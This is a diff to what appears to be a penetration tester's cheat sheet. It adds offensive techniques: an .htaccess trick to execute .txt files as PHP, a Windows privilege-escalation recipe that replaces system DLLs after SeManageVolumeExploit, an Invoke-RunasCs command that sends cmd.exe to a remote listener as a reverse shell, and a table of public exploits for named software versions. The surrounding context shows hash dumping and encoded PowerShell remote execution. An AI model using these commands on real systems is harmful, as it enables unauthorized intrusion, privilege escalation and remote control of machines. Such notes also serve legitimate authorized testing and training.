@@ -143,6 +143,8 @@ On a php webserver with a valid URL parameter,
 |`zip:///pathtoZIP#filename`|Unzips and runs `filename.php`|
 [OWASP](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)  
 
+## .htaccess
+If it can be replaced or edited, add `AddType application/x-httpd-php .txt` to make it execute `.txt` files within that directory as php.  
 
 ### Magic hashes
 PHP Loose comparison with magic hashes (0e...)  
@@ -468,6 +470,17 @@ Dump hives, transfer to kali
 	impacket-secretsdump -sam sam.hive -system system.hive LOCAL
 Dump hashes and `hashcat -m 1000`  
 
+## Windows - SeManageVolumePrivilege
+Use [SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit).  
+
+Once executed, Users will have Full Control over `C:/`.  
+
+From here, you can:  
+1. Replace a service binary and restart it
+1. Replace `C:\Windows\System32\wbem\tzres.dll` and call `systeminfo`
+1. Replace `C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll` and invoke 
+  `$object = [Activator]::CreateInstance([Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}"))`
+
 ## Windows - powershell history
 	type $((Get-PSReadlineOption).HistorySavePath)
 File is usually `Appdata/roaming/microsoft/windows/Powershell/PSreadline/consolehost_history.txt`  
@@ -760,6 +773,11 @@ Bypasses account lockout restrictions
 	$command = 'powershell -e ...'
 	Invoke-CimMethod -CimSession $Session -ClassName -Win32_Process -MethodName Create -Arguments @{CommandLine=$command}
 
+## Invoke-RunasCs
+	Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote 123.123.123.0:443
+From this [github](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1)  
+Connects to a listener and passes cmd to it.  
+
 ## winrs
 	winrs -r:hostname -u:username -p:password "powershell -e ..."
 requires Admin/Remote Management User on target
@@ -873,7 +891,12 @@ GET/POST parameters
 |HP Power Manager||CVE-2009-2685|[github](https://github.com/CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3/blob/master/hp_pm_exploit_p3.py)|Replace buf with your own msfvenom payload|
 |Argus Surveillance|4.0.0|CVE-2018-15745|[exploitdb](https://www.exploit-db.com/exploits/45296)|LFI only|
 |Argus Surveillance|4.0.0|CVE-2022-25012|[exploitdb](https://www.exploit-db.com/exploits/50130)|Consider creating new users to test passwords with special characters|
-
+|xampp|<7.4.4|CVE-2020-11107|[exploitdb](https://nvd.nist.gov/vuln/detail/CVE-2020-11107)|Modify an appropriate executable to shellcode|
+|Monstra|3.0.4||[exploitdb](https://www.exploit-db.com/exploits/52038)|Place your php payload into a new theme chunk|
+|RemoteMouse|3.008||[github](https://github.com/p0dalirius/RemoteMouse-3.008-Exploit)|Execution may be finicky|
+|Sonatype Nexus|3.21.1|CVE-2020-10199|[exploitdb](https://www.exploit-db.com/exploits/49385)|Post-auth RCE|
+|Glassfish|4.1|CVE-2017-1000028|[exploitdb](https://www.exploit-db.com/exploits/39441)|Directory traversal|
+|Synaman|4.0|CVE-2018-10814|[exploitdb](https://www.exploit-db.com/exploits/45387)|`C:/Synaman/config/AppConfig.xml`|
 
 
 
